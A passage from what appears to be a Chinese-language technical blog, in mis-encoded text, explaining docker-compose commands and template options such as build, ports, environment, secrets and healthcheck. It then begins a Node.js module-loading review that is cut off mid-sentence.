é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æžœå­˜åœ¨å…³è”ï¼Œåˆ™æ‰€æœ‰å…³è”çš„æœåŠ¡å°†ä¼šè‡ªåŠ¨è¢«å¯åŠ¨ï¼Œé™¤éžè¿™äº›æœåŠ¡å·²ç»åœ¨è¿è¡Œä¸­ è¯¥å‘½ä»¤ç±»ä¼¼å¯åŠ¨å®¹å™¨åŽæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œç›¸å…³å·ã€é“¾æŽ¥ç­‰ç­‰éƒ½ä¼šæŒ‰ç…§é…ç½®è‡ªåŠ¨åˆ›å»º ä¸¤ä¸ªä¸åŒç‚¹ï¼šç»™å®šå‘½ä»¤å°†ä¼šè¦†ç›–åŽŸæœ‰çš„è‡ªåŠ¨è¿è¡Œå‘½ä»¤ï¼Œä¸ä¼šè‡ªåŠ¨åˆ›å»ºç«¯å£ï¼Œä»¥é¿å…å†²çª å¦‚æžœä¸å¸Œæœ›è‡ªåŠ¨å¯åŠ¨å…³è”çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ --no-depsé€‰é¡¹ï¼Œä¾‹å¦‚ 1docker-compose run --no-deps web python manage.py shell å°†ä¸ä¼šå¯åŠ¨webå®¹å™¨æ‰€å…³è”çš„å…¶ä»–å®¹å™¨ é€‰é¡¹ï¼š -dåŽå°è¿è¡Œå®¹å™¨ --name NAMEä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­— --entrypoint CMDè¦†ç›–é»˜è®¤çš„å®¹å™¨å¯åŠ¨æŒ‡ä»¤ -e KEY=VALè®¾ç½®çŽ¯å¢ƒå˜é‡å€¼ï¼Œå¯å¤šæ¬¡ä½¿ç”¨é€‰é¡¹æ¥è®¾ç½®å¤šä¸ªçŽ¯å¢ƒå˜é‡ -u,--user=&quot;&quot;æŒ‡å®šè¿è¡Œå®¹å™¨çš„ç”¨æˆ·åæˆ–è€…uid --no-deps ä¸è‡ªåŠ¨å¯åŠ¨å…³è”çš„æœåŠ¡å®¹å™¨ --rm è¿è¡Œå‘½ä»¤åŽè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œdé»˜è®¤ä¸‹å°†å¿½ç•¥ -p,--publish=[] æ˜ å°„å®¹å™¨ç«¯å£åˆ°æœ¬åœ°ä¸»æœº --service-ports é…ç½®æœåŠ¡ç«¯å£å¹¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœº -T ä¸åˆ†é…ä¼ªttyï¼Œæ„å‘³ç€ä¾èµ–ttyçš„æŒ‡ä»¤å°†æ— æ³•è¿è¡Œ scale æ ¼å¼: docker-compose scale [options] [SERVICE=NUMâ€¦] è®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•° é€šè¿‡service-numçš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚ä¾‹å¦‚ 1docker-compose scale web=3 db=2 start æ ¼å¼ï¼š docker-compose start [SERVICâ€¦] å¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å™¨ stop æ ¼å¼ï¼š docker-compose stop [options] [SERVICEâ€¦] åœæ­¢å·²ç»å¤„äºŽè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒï¼Œé€šè¿‡ docker-compose startå¯ä»¥å†æ¬¡å¯åŠ¨è¿™äº›å®¹å™¨ top æŸ¥çœ‹å„ä¸ªæœåŠ¡å®¹å™¨å†…è¿è¡Œçš„å†…å­˜ unpause æ ¼å¼ï¼š docker-compose unpause [SERVICEâ€¦] æ¢å¤å¤„äºŽæš‚åœçŠ¶æ€çš„æœåŠ¡ up æ ¼å¼ï¼š docker-compose up [options] [SERVICEâ€¦] å°è¯•è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æž„å»ºé•œåƒï¼Œé‡æ–°åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œã€‚é“¾æŽ¥çš„æœåŠ¡å™¨éƒ½ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ï¼Œé™¤éžå·²ç»å¤„äºŽè¿è¡ŒçŠ¶æ€ å¤§éƒ¨åˆ†æ—¶å€™éƒ½å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªé¡¹ç›® é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose upå¯åŠ¨çš„å®¹å™¨åœ¨å‰å°ï¼ŒæŽ§åˆ¶å°å°†ä¼šåŒæ—¶æ‰“å°æ‰€æœ‰å®¹å™¨çš„ä¿¡æ¯ï¼Œå¯ä»¥æ–¹ä¾¿è°ƒè¯•ï¼Œä½¿ç”¨ ctrl-cåœæ­¢å‘½ä»¤æ—¶ï¼Œæ‰€æœ‰å®¹å™¨å°†ä¼šåœæ­¢ ç”Ÿäº§çŽ¯å¢ƒæŽ¨èä½¿ç”¨ docker-compose up -dï¼Œè¿™å°†ä¼šåœ¨åŽå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰å®¹å™¨ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æžœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œdocker-compose upå°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åŽé‡æ–°åˆ›å»ºï¼ˆä¿æŒä½¿ç”¨volume-fromæŒ‚è½½çš„å·ï¼‰ï¼Œä»¥ä¿è¯æ–°çš„æœåŠ¡åŒ¹é…docker-compose.ymlæ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚å¦‚æžœä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up â€“no-recreateã€‚è¿™æ ·åªä¼šå¯åŠ¨å¤„äºŽåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ï¼Œå¦‚æžœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up --no-deps -d &lt;SERVICE_NAME&gt;æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åŽå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°æœŸæ‰€ä¾èµ–çš„æœåŠ¡ã€‚ é€‰é¡¹ï¼š -dåœ¨åŽå°è¿è¡ŒæœåŠ¡å®¹å™¨ --no-colorä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æŽ§åˆ¶å°è¾“å‡º --no-depsä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æŽ¥çš„å®¹å™¨ --force-recreateå¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸Ž--no-recreateåŒæ—¶ä½¿ç”¨ --no-buldä¸è‡ªåŠ¨æž„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒ -t,timeout TIMEOUT`åœæ­¢åŒæœŸæ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º10ç§’ï¼‰ version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ æ¨¡æ¿æ–‡ä»¶æ¨¡æ¿æ–‡ä»¶å°±æ˜¯ä½¿ç”¨composeçš„æ ¸å¿ƒï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤è·Ÿdocker runç›¸å…³å‚æ•°çš„å«ä¹‰ç±»ä¼¼ é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶åç§°ä¸º docker-compose.ymlï¼Œæ ¼å¼ä¸ºYAMLæ ¼å¼ 123456789version: "3"services: webapp: image: example/web ports: - "80:80" volumes: - "/data" æ¯ä¸ªæœåŠ¡éƒ½å¿…é¡»é€šè¿‡imageæŒ‡ä»¤æŒ‡å®šé•œåƒæˆ–buildï¼ˆéœ€è¦Dockerfileï¼‰æŒ‡ä»¤ç­‰æ¥è‡ªåŠ¨æž„å»ºç”Ÿæˆé•œåƒ å¦‚æžœä½¿ç”¨buildå‘½ä»¤ï¼Œåœ¨Dockerfileä¸­è®¾ç½®çš„é€‰é¡¹ï¼Œä¾‹å¦‚CMD/EXPOSE/VOLUME/ENVç­‰å°†ä¼šè¢«è‡ªåŠ¨èŽ·å–ï¼Œæ— éœ€åœ¨docker-compose.ymlä¸­å†æ¬¡è®¾ç½®ã€‚ buildæŒ‡å®šDockerfileæ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼ˆå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œæˆ–è€…ç›¸å¯¹docker-compose.ymlæ–‡ä»¶è·¯å¾„ï¼‰ï¼ŒComposeå°†ä¼šåˆ©ç”¨å®ƒè‡ªåŠ¨æž„å»ºè¿™ä¸ªé•œåƒï¼Œç„¶åŽä½¿ç”¨è¿™ä¸ªé•œåƒ 1234version: '3'services: webapps: build: ./dir ä¹Ÿå¯ä»¥ä½¿ç”¨contextæŒ‡ä»¤æŒ‡å®šDockerfileæ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼ŒdockerfileæŒ‡ä»¤æŒ‡å®šDockerfileæ–‡ä»¶åï¼ŒargæŒ‡ä»¤æŒ‡å®šæž„å»ºé•œåƒæ—¶çš„å˜é‡ 12345678version: '3'services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 ä½¿ç”¨cache_fromæŒ‡å®šæž„å»ºé•œåƒçš„ç¼“å­˜ 12345build: context: . cache_from: - alpine:latest - corp/web_app:3.14 cap_add,cap_dropæŒ‡å®šå®¹å™¨çš„å†…æ ¸èƒ½åŠ›ï¼ˆcapacityï¼‰åˆ†é… 123456# è®©å®¹å™¨æ‹¥æœ‰æ‰€æœ‰èƒ½åŠ›cap_add: - ALL# åŽ»æŽ‰ NET_ADMINèƒ½åŠ›cap_drop: - NET_ADMIN configsã€deployä»…ç”¨äºŽSwarm mode cgroup_parentæŒ‡å®šçˆ¶cgroupç»„ï¼Œæ„å‘³ç€å°†ç»§æ‰¿æ”¹ç»„çš„èµ„æºé™åˆ¶ 12# åˆ›å»ºä¸€ä¸ªcgroupç»„åç§°ä¸ºcgroups_1cgroup_parent: cgroups_1 container_nameæŒ‡å®šå®¹å™¨åç§°ã€‚é»˜è®¤ä½¿ç”¨é¡¹ç›®åç§°_æœåŠ¡åç§°_åºå· 12container_name:docker-web-container# æŒ‡å®šå®¹å™¨åç§°åŽï¼Œè¯¥æœåŠ¡å°†æ— æ³•è¿›è¡Œæ‰©å±•ï¼ˆscaleï¼‰,å› æ­¤Dockerä¸ä¼šå…è®¸å¤šä¸ªå®¹å™¨å…·æœ‰ç›¸åŒçš„åç§° devicesæŒ‡å®šè®¾å¤‡æ˜ å°„å…³ç³» 12devices: - "/dev/ttyUSB1:/dev/ttyUSB0" depends_onè§£å†³å®¹å™¨çš„ä¾èµ–ã€å¯åŠ¨å…ˆåŽé—®é¢˜ã€‚ 1234567891011121314# å…ˆå¯åŠ¨redis db å†å¯åŠ¨webversion: '3'services: web: build: . depends_on: - db - redis redis: image: redis db: image:postgres# webæœåŠ¡ä¸ä¼šç­‰å¾…redis dbå®Œå…¨å¯åŠ¨ä¹‹åŽæ‰å¯åŠ¨ dnsè‡ªå®šä¹‰DNSæœåŠ¡å™¨ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ 1234dns: 8.8.8.8dns: - 8.8.8.8 - 114.114.114.114 dns_searché…ç½®DNSæœç´¢åŸŸï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ 12345dns_search:example.comdns_search: - domain1.example.com - domain2.example.com tmpfsæŒ‚è½½ä¸€ä¸ªtmpfsæ–‡ä»¶ç³»ç»Ÿåˆ°å®¹å™¨ 1234tmpfs: /runtmpfs: - /run - /tmp env_fileä»Žæ–‡ä»¶ä¸­èŽ·å–çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºå•ç‹¬çš„æ–‡ä»¶è·¯å¾„æˆ–åˆ—è¡¨ é€šè¿‡ docker-compose -f FILEæ–¹å¼æ¥æŒ‡å®šComposeæ¨¡æ¿æ–‡ä»¶ï¼Œåˆ™ env_fileä¸­å˜é‡çš„è·¯å¾„ä¼šåŸºäºŽæ¨¡æ¿æ–‡ä»¶è·¯å¾„ã€‚å¦‚æžœæœ‰å˜é‡åç§°ä¸ŽenvironmentæŒ‡ä»¤å†²çªï¼Œåˆ™æŒ‰ç…§æƒ¯ä¾‹ï¼Œä»¥åŽè€…ä¸ºå‡† 123456env_file: .envenv_file: - ./common.env - ./apps/web.env - /opt/secrets.env çŽ¯å¢ƒå˜é‡æ–‡ä»¶ä¸­æ¯ä¸€è¡Œå¿…é¡»ç¬¦åˆæ ¼å¼ï¼Œæ”¯æŒ#å¼€å¤´çš„æ³¨é‡Šè¡Œ 12# common.env: Set development environmentFROG_ENV=development environmentè®¾ç½®çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„å’Œå­—å…¸ä¸¤ç§æ ¼å¼ åªç»™å®šåç§°çš„å˜é‡ä¼šè‡ªåŠ¨èŽ·å–è¿è¡ŒComposeä¸»æœºä¸Šå¯¹åº”å˜é‡çš„å€¼ï¼Œå¯ä»¥ç”¨é˜¿é‡Œé˜²æ­¢æ³„éœ²ä¸å¿…è¦çš„æ•°æ® 12345678environment: RACK_ENV: development SESSION_SECRET:environment: - RACK_ENV=development - SESSION_SECRET å¦‚æžœå˜é‡åç§°æˆ–è€…å€¼ä¸­ç”¨åˆ°true|false,yse|noç­‰è¡¨ç¤ºå¸ƒå°”å«ä¹‰çš„è¯æ±‡ï¼Œæœ€å¥½æ”¾åˆ°å¼•å·ä¸­ï¼Œé¿å…YAMLè‡ªåŠ¨è§£æžæŸäº›å†…å®¹ä¸ºå¯¹åº”çš„å¸ƒå°”è¯­ä¹‰ï¼Œè¿™äº›ç‰¹å®šè¯æ±‡ï¼ŒåŒ…æ‹¬ 1y|Y|Yes|YES|n|N|no|NO|true|True|TRUE|false|False|FALSE|on|ON|off|Off|OFF exposeæš´éœ²ç«¯å£ï¼Œä½†ä¸æ˜ å°„åˆ°å®¿ä¸»æœºï¼Œåªè¢«è¿žæŽ¥çš„æœåŠ¡è®¿é—®ã€‚ä»…å¯ä»¥æŒ‡å®šå†…éƒ¨ç«¯å£ä¸ºå‚æ•° 123expose: - "3000" - "8000" external_linksé“¾æŽ¥åˆ°docker-compose.ymlå¤–éƒ¨çš„å®¹å™¨ï¼Œç”šè‡³å¹¶éžComposeç®¡ç†çš„å¤–éƒ¨å®¹å™¨ï¼Œä¸å»ºè®®ä½¿ç”¨ 1234external_links: - redis_1 - project_db_1:mysql - project_db_1:postgresql extra_hostsç±»ä¼¼Dockerä¸­çš„--add-hostå‚æ•°ï¼ŒæŒ‡å®šé¢å¤–çš„hoståç§°æ˜ å°„ä¿¡æ¯ 123extra_hosts: - "googledns:8.8.8.8" - "dockerhub:52.1.157.61" ä¼šåœ¨å¯åŠ¨åŽçš„æœåŠ¡å®¹å™¨ä¸­ /etc/hostsæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä¸¤æ¡æ¡ç›® 128.8.8.8 googledns52.1.157.61 dockerhub healthchecké€šè¿‡å‘½ä»¤æ£€æŸ¥å®¹å™¨æ˜¯å¦å¥åº·è¿è¡Œ 12345healthcheck: test: ["CMD","curl","-f","http://localhost"] interval: 1m30s timeout: 10s retries: 3 imageæŒ‡å®šä¸ºé•œåƒåç§°æˆ–è€…é•œåƒID,å¦‚æžœé•œåƒåœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼ŒComposeå°†ä¼šå°è¯•æ‹‰å–è¿™ä¸ªé•œåƒ 123image: ubuntuimage: orchardup/postgresqlimage: a4bc65fd labelsä¸ºå®¹å™¨æ·»åŠ Dockerå…ƒæ•°æ®ï¼ˆmetadataï¼‰ä¿¡æ¯ï¼Œå¯ä»¥ä¸ºå®¹å™¨æ·»åŠ è¾…åŠ©è¯´æ˜Žä¿¡æ¯ 1234labels: com.startupteam.description: "webapp for a startup team" com.startupteam.department: "depvops department" com.startupteam.release: "rc3 for v1.0" linksä¸æŽ¨èä½¿ç”¨è¯¥æŒ‡ä»¤ loggingé…ç½®æ—¥å¿—é€‰é¡¹ 1234567891011121314loggin: driver: syslog options: syslog-address: "tcp://192.168.0.42:123"# ç›®å‰æ”¯æŒä¸‰ç§æ—¥å¿—é©±åŠ¨ç±»åž‹driver: "json-file"driver: "syslog"driver: "none"# optionsé…ç½®æ—¥å¿—é©±åŠ¨çš„ç›¸å…³å‚æ•°options: max-size: "200k" max-file: "10" network_modeè®¾ç½®ç½‘ç»œæ¨¡å¼ï¼Œä½¿ç”¨å’Œ docker run çš„ networkå‚æ•°ä¸€æ ·çš„å€¼ 12345network_mode: "bridge"network_mode: "host"network_mode: "none"network_mode: "service:[service name]"network_mode: "container:[container name/id]" networksé…ç½®å®¹å™¨è¿žæŽ¥çš„ç½‘ç»œ 12345678910version: "3"services: some-service: networks: - some-network - other-networknetworks: some-network: other-network: pidè·Ÿä¸»æœºç³»ç»Ÿå…±äº«è¿›ç¨‹å‘½åç©ºé—´ï¼Œæ‰“å¼€è¯¥é€‰é¡¹çš„å®¹å™¨ä¹‹é—´ï¼Œä»¥åŠå®¹å™¨å’Œå®¿ä¸»æœºç³»ç»Ÿä¹‹é—´å¯ä»¥é€šè¿‡è¿›ç¨‹IDæ¥äº’ç›¸è®¿é—®å’Œæ“ä½œ 1pid: "host" portsæš´éœ²ç«¯å£ä¿¡æ¯ ä½¿ç”¨å®¿ä¸»ç«¯å£ï¼šå®¹å™¨ç«¯å£ï¼ˆHOST:CONTAINERï¼‰æ ¼å¼ï¼Œæˆ–è€…ä»…ä»…æŒ‡å®šå®¹å™¨çš„ç«¯å£ï¼ˆå®¿ä¸»å°†ä¼šéšæœºé€‰æ‹©ç«¯å£ï¼‰éƒ½å¯ä»¥ 1234567ports: - "3000" - "8000:8000" - "49100:22" - "127.0.0.1:8001:8001"# å½“ä½¿ç”¨ HOST:CONTAINERæ ¼å¼æ˜ å°„ç«¯å£æ—¶ï¼Œä½¿ç”¨çš„å®¹å™¨ç«¯å£å°äºŽ60å¹¶ä¸”æ²¡æœ‰æ”¾åˆ°å¼•å·é‡Œï¼Œå¯èƒ½ä¼šå¾—åˆ°é”™è¯¯ç»“æžœï¼Œå› ä¸ºYAMLä¼šè‡ªåŠ¨è§£æžxx:yyï¼Œè¿™ç§æ•°å­—æ ¼å¼ä¸º60è¿›åˆ¶ï¼Œä¸ºé¿å…å‡ºçŽ°è¿™ä¸ªé—®é¢˜ï¼Œå»ºè®®æ•°å­—ä¸²éƒ½é‡‡ç”¨å¼•å·åŒ…æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²æ ¼å¼ secretså­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚mysqlæœåŠ¡å¯†ç  12345678910111213141516version: "3.1"servicesï¼šmysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password secrets: - db_root_password - my_other_secret secrets: my_secret: file: ./my_secret.txt my_other_secret: external: true security_optæŒ‡å®šå®¹å™¨æ¨¡æ¿æ ‡ç­¾labelæœºåˆ¶çš„é»˜è®¤å±žæ€§ï¼ˆç”¨æˆ·ã€è§’è‰²ã€ç±»åž‹ã€çº§åˆ«ç­‰ï¼‰ã€‚ä¾‹å¦‚é…ç½®æ ‡ç­¾çš„ç”¨æˆ·åå’Œè§’è‰²å 123security_opt: - label:user:USER - label:role:ROLE stop_signalè®¾ç½®å¦ä¸€ä¸ªä¿¡å·æ¥åœæ­¢å®¹å™¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯SIGTERMåœæ­¢å®¹å™¨ 1stop_signal: SIGUSR1 sysctlsé…ç½®å®¹å™¨å†…æ ¸å‚æ•° 1234567sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0 sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 ulimitsæŒ‡å®šå®¹å™¨çš„ulimitsé™åˆ¶å€¼ ä¾‹å¦‚ï¼ŒæŒ‡å®šæœ€å¤§å®¹å™¨çš„è¿›ç¨‹æ•°ä¸º65535.æŒ‡å®šæ–‡ä»¶å¥æŸ„æ•°ä¸º20000ï¼ˆè½¯é™åˆ¶ï¼Œåº”ç”¨å¯ä»¥éšæ—¶ä¿®æ”¹ï¼Œä¸èƒ½è¶…è¿‡ç¡¬é™åˆ¶ï¼‰å’Œ40000ï¼ˆç³»ç»Ÿç¡¬é™åˆ¶ï¼Œåªèƒ½rootç”¨æˆ·æé«˜ï¼‰ 12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumesæ•°æ®å·æ‰€æŒ‚è½½è·¯å¾„è®¾ç½®ï¼Œå¯ä»¥è®¾ç½®å®¿ä¸»ä¸»æœºè·¯å¾„ï¼ˆHOST:CONTAINERï¼‰æˆ–åŠ ä¸Šè®¿é—®æ¨¡å¼ï¼ˆHOST:CONTAINER:roï¼‰ è¯¥æŒ‡ä»¤ä¸­è·¯å¾„æ”¯æŒç›¸å¯¹è·¯å¾„ 1234volumes: - /var/lib/mysql - cache/:tmp/cache - ~/configs:/etc/configs/:ro å…¶ä»–æŒ‡ä»¤domainname,entrypoint,hostname,ipc,mac_address,privileged,read_only,shm_size,restart,stdin_open,tty,user,worç­‰æŒ‡ä»¤ï¼ŒåŸºæœ¬è·Ÿ docker runä¸­å¯¹åº”å‚æ•°çš„åŠŸèƒ½ä¸€è‡´ 12345678910111213141516171819202122232425262728# æŒ‡å®šæœåŠ¡å®¹å™¨å¯åŠ¨åŽæ‰§è¡Œçš„å…¥å£æ–‡ä»¶entrypoint: /code/entrypoint.sh# æŒ‡å®šå®¹å™¨ä¸­è¿è¡Œåº”ç”¨çš„ç”¨æˆ·åuser: nginx# æŒ‡å®šå®¹å™¨ä¸­å·¥ä½œç›®å½•working_dir: /code# æŒ‡å®šå®¹å™¨ä¸­æœç´¢åŸŸåã€ä¸»æœºåã€macåœ°å€ç­‰domainname: your_website.comhostname: testmac_address: 08-00-27-00-0C-0A# å…è®¸å®¹å™¨ä¸­è¿è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤privileged: true# æŒ‡å®šå®¹å™¨é€€å‡ºåŽçš„é‡å¯ç­–ç•¥ä¸ºå§‹ç»ˆé‡å¯ã€‚è¯¥å‘½ä»¤å¯¹ä¿æŒæœåŠ¡å§‹ç»ˆè¿è¡Œååˆ†æœ‰æ•ˆï¼Œåœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­æŽ¨èé…ç½®ä¸ºalwaysæˆ–è€…unless-stoppedrestart: always# åªè¯»æ¨¡å¼æŒ‚è½½å®¹å™¨çš„ root æ–‡ä»¶ç³»ç»Ÿï¼Œæ„å‘³ç€ä¸èƒ½å¯¹å®¹å™¨å†…å®¹è¿›è¡Œä¿®æ”¹read_only: true# æ‰“å¼€æ ‡å‡†è¾“å…¥ï¼Œå¯ä»¥æŽ¥å—å¤–éƒ¨è¾“å…¥stdin_open: true# æ¨¡æ‹Ÿä¸€ä¸ªä¼ªç»ˆç«¯tty: true è¯»å–å˜é‡Composeæ¨¡æ¿æ–‡ä»¶æ”¯æŒåŠ¨æ€è¯»å–ä¸»æœºçš„ç³»ç»ŸçŽ¯å¢ƒå˜é‡å’Œå½“å‰ç›®å½•ä¸‹çš„ .envæ–‡ä»¶ä¸­çš„å˜é‡ ä¾‹å¦‚ï¼Œä¸‹é¢çš„Composeæ–‡ä»¶å°†ä»Žè¿è¡Œå®ƒçš„çŽ¯å¢ƒä¸­è¯»å–å˜é‡ ${MONGO_VERSION}çš„å€¼ï¼Œå¹¶å†™å…¥æ‰§è¡Œçš„æŒ‡ä»¤ä¸­ 12345verison: '3'services:db: image: "mongo:$&#123;MONGO_VERSION&#125;" å¦‚æžœæ‰§è¡Œ MONGO_VERSION=3.2 docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:3.2 é•œåƒçš„å®¹å™¨ï¼›å¦‚æžœæ‰§è¡Œ MONGO_VERSION=2.8 docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:2.8 é•œåƒçš„å®¹å™¨ã€‚ è‹¥å½“å‰ç›®å½•å­˜åœ¨ .env æ–‡ä»¶ï¼Œæ‰§è¡Œ docker-compose å‘½ä»¤æ—¶å°†ä»Žè¯¥æ–‡ä»¶ä¸­è¯»å–å˜é‡ã€‚ åœ¨å½“å‰ç›®å½•æ–°å»º .env æ–‡ä»¶å¹¶å†™å…¥ä»¥ä¸‹å†…å®¹ã€‚ 12# æ”¯æŒ # å·æ³¨é‡ŠMONGO_VERSION=3.6 æ‰§è¡Œ docker-compose up åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª mongo:3.6 é•œåƒçš„å®¹å™¨ã€‚]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJså›žé¡¾]]></title>
    <url>%2F2020-06-19-NodeJS%E5%9B%9E%E9%A1%BE.html</url>
    <content type="text"><![CDATA[NodeJSæ¨¡å—ä¸Žæ–‡ä»¶require çš„åŠ è½½æœºåˆ¶æ¨¡å—çš„åˆ†ç±»ç³»ç»Ÿæ¨¡å— C/C++æ¨¡å—ï¼Œä¹Ÿå«build-inå†…å»ºæ¨¡å—ï¼Œä¸€èˆ¬ç”¨äºŽnativeæ¨¡å—å—²ç”¨ï¼Œåœ¨requireå‡ºåŽ» nativeæ¨¡å—ï¼Œåœ¨å¼€å‘ä¸­ä½¿ç”¨çš„Node.js çš„ http/buffer/fsç­‰ï¼Œåº•å±‚ä¹Ÿæ˜¯è°ƒç”¨çš„å†…å»ºæ¨¡å—ï¼ˆC/C++ï¼‰ ç¬¬ä¸‰æ–¹æ¨¡å—ï¼š éžNode.jsè‡ªå¸¦çš„æ¨¡å—è¢«ç§°ä¸ºç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œä¼šåˆ†æˆè·¯å¾„å½¢å¼çš„æ–‡ä»¶æ¨¡å—ï¼ˆä»¥.ã€..ã€/å¼€å¤´çš„ï¼‰å’Œè‡ªå®šä¹‰çš„æ¨¡å—ï¼ˆæ¯”å¦‚express/koa/moment.jsç­‰ï¼‰ åœ¨ Node.JS ä¸­æ¨¡å—åŠ è½½ä¸€èˆ¬ä¼šç»åŽ†3ä¸ªæ­¥éª¤ï¼šè·¯å¾„åˆ†æžã€æ–‡ä»¶å®šä½ã€ç¼–è¯‘æ‰§è¡Œ æŒ‰ç…§æ¨¡å—çš„åˆ†ç±»ï¼ŒæŒ‰ç…§ä»¥ä¸‹çš„é¡ºåºè¿›è¡Œä¼˜å…ˆåŠ è½½ï¼š ç³»ç»Ÿç¼“å­˜ï¼šæ¨¡å—è¢«æ‰§è¡Œä¹‹åŽä¼šè¿›è¡Œç¼“å­˜ï¼Œé¦–å…ˆæ˜¯å…ˆè¿›è¡Œç¼“å­˜åŠ è½½ï¼Œåˆ¤æ–­æ¢ç²—ä¸­æ˜¯å¦æœ‰å€¼ã€‚ ç³»ç»Ÿæ¨¡å—ï¼šä¹Ÿå°±æ˜¯åŽŸç”Ÿæ¨¡å—ï¼Œä¼˜å…ˆçº§æ¬¡äºŽç³»ç»Ÿç¼“å­˜ï¼Œéƒ¨åˆ†æ ¸å¿ƒæ¨¡å—å·²ç»è¢«ç¼–è¯‘æˆäºŒè¿›åˆ¶ï¼Œçœç•¥äº†è·¯å¾„åˆ†æžã€æ–‡ä»¶å®šä½ï¼Œç›´æŽ¥åŠ è½½åœ¨å†…å­˜ä¸­ï¼Œç³»ç»Ÿæ¨¡å—å®šä¹‰åœ¨ Node.js æºç çš„libç›®å½•ä¸‹ã€‚ æ–‡ä»¶æ¨¡å—ï¼šä¼˜å…ˆåŠ è½½ .ã€..ã€/å¼€å¤´çš„ï¼Œå¦‚æžœæ–‡ä»¶æ²¡æœ‰åŠ ä¸Šæ‹“å±•åï¼Œä¼šä¾æ¬¡æŒ‰ç…§.jsã€.jsonã€.nodeå°è¯•è¿›è¡Œæ‹“å±•åè¡¥è¶³ã€‚ï¼ˆåœ¨å°è¯•è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯ä»¥åŒæ­¥é˜»å¡žæ¨¡å¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„ï¼Œä»Žæ€§èƒ½ä¼˜åŒ–è§’åº¦æ¥çœ‹ï¼Œ.jsonã€nodeæœ€å¥½è¿˜æ˜¯åŠ ä¸Šæ–‡ä»¶çš„æ‹“å±•åï¼‰ ç›®å½•ä½œä¸ºæ¨¡å—ï¼šæ–‡ä»¶æ¨¡å—åŠ 